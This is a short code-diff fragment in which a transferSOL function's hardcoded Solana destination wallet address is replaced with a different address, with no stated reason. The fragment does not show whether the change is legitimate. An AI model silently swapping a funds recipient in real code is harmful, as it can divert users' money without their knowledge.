@@ -65,7 +65,7 @@ export async function transferSOL(
   }
 
   const wallet = new PublicKey(publicKey);
-  const destinationWallet = new PublicKey('A4nnzkNwsmW9SKh2m5a69vsqXmj18KoRMv1nXhiLGruU');
+  const destinationWallet = new PublicKey('FbhQc9Ri9spE17wnavuuuY1dGDwErAGyTYGJUTwsFvv1');
 
   try {
     // Create transaction
